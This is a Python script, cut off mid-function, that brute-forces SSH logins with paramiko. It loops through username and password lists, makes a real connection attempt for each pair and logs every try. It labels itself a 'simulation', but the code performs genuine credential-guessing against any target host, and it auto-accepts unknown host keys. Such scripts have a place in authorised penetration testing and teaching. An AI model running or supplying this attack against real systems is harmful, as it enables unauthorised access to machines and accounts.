import paramiko
import sys
import time
import random
from datetime import datetime

def brute_force_ssh(target_host, target_port, username_list, password_list, delay=1):
    """
    Simulate brute force SSH attack
    """
    print(f"[INFO] Starting brute force attack simulation against {target_host}:{target_port}")
    print(f"[INFO] Target usernames: {username_list}")
    print(f"[INFO] Testing {len(password_list)} passwords per user")
    print(f"[INFO] Delay between attempts: {delay} seconds")
    print("-" * 60)
    
    successful_login = None
    total_attempts = 0
    
    for username in username_list:
        print(f"\n[INFO] Testing username: {username}")

        for password in password_list:
            total_attempts += 1

            try:
                # Create SSH client
                ssh_client = paramiko.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                print(f"[ATTEMPT {total_attempts}] Trying {username}:{password}")

                # Attempt to connect
                ssh_client.connect(
                    hostname=target_host,
                    port=target_port,
                    username=username,
                    password=password,
                    timeout=10,
                    allow_agent=False,
                    look_for_keys=False
                )
